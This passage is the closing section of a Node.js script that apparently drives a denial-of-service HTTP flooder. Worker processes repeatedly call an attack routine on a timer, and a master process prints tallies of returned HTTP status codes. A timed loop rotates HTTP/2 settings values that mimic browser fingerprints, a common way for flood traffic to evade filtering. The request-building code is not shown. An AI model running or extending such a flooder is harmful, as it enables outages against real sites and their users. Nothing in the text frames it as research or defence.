                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    let i = setInterval(() => {
        enhancedGo();
    }, delay);

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}

// ========== DYNAMIC SETTINGS UPDATER ==========
setInterval(() => {
    timer++;
    if (timer <= 10) {
        updateDynamicSettings();
    } else {
        custom_table = 65535;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);